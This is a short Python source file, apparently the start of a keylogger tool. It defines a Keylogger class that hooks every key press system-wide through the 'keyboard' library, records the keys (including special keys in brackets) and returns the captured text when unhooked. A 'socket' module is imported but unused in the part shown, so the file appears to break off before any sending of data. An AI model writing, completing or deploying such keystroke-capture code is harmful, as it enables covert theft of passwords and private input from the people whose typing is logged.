import keyboard
import socket

class Keylogger:
    def __init__(self):
        self.keystroke_logged = []
        self.hooking = False
        
    def callback(self, event):
        key = keyboard.normalize_name(event.name)
        if key == 'space':
            key = ' '
        elif key == 'enter':
            key = '\n'
        elif len(key) != 1:
            key = '[' + key + ']'
        self.keystroke_logged.append(key)

    def hook(self):
        if self.hooking == False:
            self.hooking = True
            keyboard.on_press(callback=self.callback)

    def unhook(self):
        if self.hooking == True:
            self.hooking = False
            keyboard.unhook_all()
            r = ''
            for key in self.keystroke_logged:
                r += key
            self.keystroke_logged.clear()
            return r
    